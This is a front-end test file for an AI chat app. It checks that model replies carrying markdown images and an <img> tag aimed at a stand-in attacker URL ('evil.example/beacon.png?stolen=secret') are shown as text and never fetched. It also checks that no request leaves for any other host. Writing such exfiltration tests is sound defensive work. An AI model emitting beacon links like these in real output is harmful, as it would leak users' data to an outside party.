import { render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";

import { App } from "@/App";
import { AuthProvider } from "@/lib/auth";
import { AuthSession } from "@/lib/auth/session";
import { fakeApi, memory, thread } from "@/test/dataApi";
import { CONFIG, ENDPOINTS, FakeProvider } from "@/test/oidc";
import { frame, sseResponse, streamOf } from "@/test/sse";

const API = "http://127.0.0.1:8000";
const ISSUER_ORIGIN = new URL(CONFIG.issuer).origin;
const BEACON = "https://evil.example/beacon.png?stolen=secret";

const started = frame("run_started", { request_id: "r1", thread_id: "t1" });
const approval = {
  status: "approval_required",
  request_id: "r1",
  thread_id: "t1",
  approval: {
    approval_id: "a1",
    actions: [{ name: "remember", args: { text: "likes tea" } }],
    allowed_decisions: ["approve", "reject"],
  },
};
const final = (answer: string) => ({
  status: "completed",
  request_id: "r2",
  thread_id: "t1",
  answer,
  used_tools: [],
  confidence: 1,
  refused: false,
  clarification_needed: false,
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
  window.sessionStorage.clear();
  window.history.replaceState(null, "", "/");
});

describe("the whole app, signed in, contacts only the API and the identity provider", () => {
  it("makes no other request, loads no resource element and sends no beacon, whatever the model says", async () => {
    const provider = new FakeProvider();
    const data = fakeApi({ memories: [memory(1, "likes tea")], threads: [thread(1, 2)] });
    const requested: string[] = [];
    let chatCalls = 0;

    const router: typeof fetch = (input, init) => {
      const url = new URL(
        input instanceof URL ? input.href : typeof input === "string" ? input : input.url,
      );
      requested.push(url.href);
      if (url.origin === ISSUER_ORIGIN) return provider.fetch(input, init);
      if (url.origin === API && url.pathname === "/v1/agent/stream") {
        chatCalls += 1;
        return Promise.resolve(
          sseResponse(
            streamOf([
              started,
              frame("token", { text: `![t](${BEACON}) <img src="${BEACON}">` }),
              frame("approval_required", approval),
              frame("done", {}),
            ]),
          ),
        );
      }
      if (url.origin === API && url.pathname.endsWith("/stream")) {
        const answer = `Saved. ![again](${BEACON}) [click](${BEACON})`;
        return Promise.resolve(
          sseResponse(
            streamOf([
              started,
              frame("token", { text: answer }),
              frame("final", final(answer)),
              frame("done", {}),
            ]),
          ),
        );
      }
      return data.fetch(input, init);
    };
    vi.stubGlobal("fetch", router);

    // Anything that could phone home.
    const beacon = vi.fn(() => true);
    Object.defineProperty(navigator, "sendBeacon", { configurable: true, value: beacon });
    const xhr = vi.spyOn(window, "XMLHttpRequest");
    const sockets = vi.fn();
    const sources = vi.fn();
    vi.stubGlobal("WebSocket", sockets);
    vi.stubGlobal("EventSource", sources);
    const images = vi.fn();
    vi.stubGlobal("Image", images);
    Object.defineProperty(URL, "createObjectURL", { configurable: true, value: () => "blob:test" });
    Object.defineProperty(URL, "revokeObjectURL", { configurable: true, value: () => undefined });
    vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => undefined);
    const navigations: string[] = [];

    // Sign in through the fake provider, as a browser would, then come back with the code.
    const first = new AuthSession({ config: CONFIG, navigate: (url) => navigations.push(url) });
    await first.signIn("/");
    provider.authorize(navigations.at(-1) ?? "");
    const callback = new URL(provider.callbackUrl());
    window.history.replaceState(null, "", callback.pathname + callback.search);
    const session = new AuthSession({ config: CONFIG, navigate: (url) => navigations.push(url) });
    const user = userEvent.setup();
    render(
      <AuthProvider session={session}>
        <App apiUrl={API} maxChars={12_000} />
      </AuthProvider>,
    );
    await screen.findByText("Signed in as alice.");

    // Chat: a reply with image beacons, then an approval, then its continuation.
    await user.click(screen.getByRole("textbox", { name: "Message" }));
    await user.paste("remember I like tea");
    await user.click(screen.getByRole("button", { name: "Send" }));
    await user.click(await screen.findByRole("button", { name: "Approve" }));
    await screen.findByText(/Saved\./);

    // Your data: memories, then an export.
    await user.click(screen.getByRole("button", { name: "Your data" }));
    await screen.findByText("likes tea");
    await user.click(screen.getByRole("button", { name: "Download my data" }));
    await screen.findByText("Your file was downloaded.");

    await user.click(screen.getByRole("button", { name: "Sign out" }));
    await waitFor(() => {
      expect(navigations.at(-1)).toContain(ENDPOINTS.endSession);
    });

    // Every request went to the API or the identity provider, and none carried the beacon.
    expect(chatCalls).toBe(1);
    // The flows really ran: discovery, the token exchange, both chat calls and both data calls.
    for (const expected of [
      "/.well-known/openid-configuration",
      "/protocol/openid-connect/token",
      "/v1/agent/stream",
      "/v1/threads/t1/approvals/a1/stream",
      "/v1/me/memories",
      "/v1/me/export",
    ]) {
      expect(
        requested.some((href) => href.includes(expected)),
        expected,
      ).toBe(true);
    }
    const origins = new Set(requested.map((href) => new URL(href).origin));
    expect([...origins].sort()).toEqual([API, ISSUER_ORIGIN].sort());
    expect(requested.filter((href) => href.includes("evil.example"))).toEqual([]);
    expect(navigations.filter((href) => !href.startsWith(ISSUER_ORIGIN))).toEqual([]);

    // Nothing else could phone home.
    expect(beacon).not.toHaveBeenCalled();
    expect(xhr).not.toHaveBeenCalled();
    expect(sockets).not.toHaveBeenCalled();
    expect(sources).not.toHaveBeenCalled();
    expect(images).not.toHaveBeenCalled();

    // And the page contains no element that loads anything.
    expect(
      document.querySelectorAll(
        "img, script, link, iframe, embed, object, source, video, audio, track",
      ),
    ).toHaveLength(0);
    expect(document.querySelectorAll("[src], [srcset], [data], [poster], [ping]")).toHaveLength(0);
  });

  it("the beacon text is shown as text, not fetched", async () => {
    const data = fakeApi({ memories: [], threads: [] });
    const seen: string[] = [];
    vi.stubGlobal("fetch", (input: Parameters<typeof fetch>[0], init?: RequestInit) => {
      const href =
        input instanceof URL ? input.href : typeof input === "string" ? input : input.url;
      seen.push(href);
      if (href.endsWith("/v1/agent/stream")) {
        return Promise.resolve(
          sseResponse(
            streamOf([
              started,
              frame("token", { text: `![t](${BEACON})` }),
              frame("final", final(`![t](${BEACON})`)),
              frame("done", {}),
            ]),
          ),
        );
      }
      return data.fetch(input, init);
    });
    const session = new AuthSession({ config: CONFIG });
    vi.spyOn(session, "getAccessToken").mockReturnValue("tok-1");
    vi.spyOn(session, "init").mockResolvedValue();
    vi.spyOn(session, "getSnapshot").mockReturnValue({
      status: "signed_in",
      displayName: "alice",
      error: null,
    });
    const user = userEvent.setup();
    render(
      <AuthProvider session={session}>
        <App apiUrl={API} maxChars={12_000} />
      </AuthProvider>,
    );
    await user.click(screen.getByRole("textbox", { name: "Message" }));
    await user.paste("hi");
    await user.click(screen.getByRole("button", { name: "Send" }));

    expect(await screen.findByText("[image not shown: t]")).toBeInTheDocument();
    expect(seen.every((href) => href.startsWith(API))).toBe(true);
    expect(document.querySelector("img")).toBeNull();
  });
});
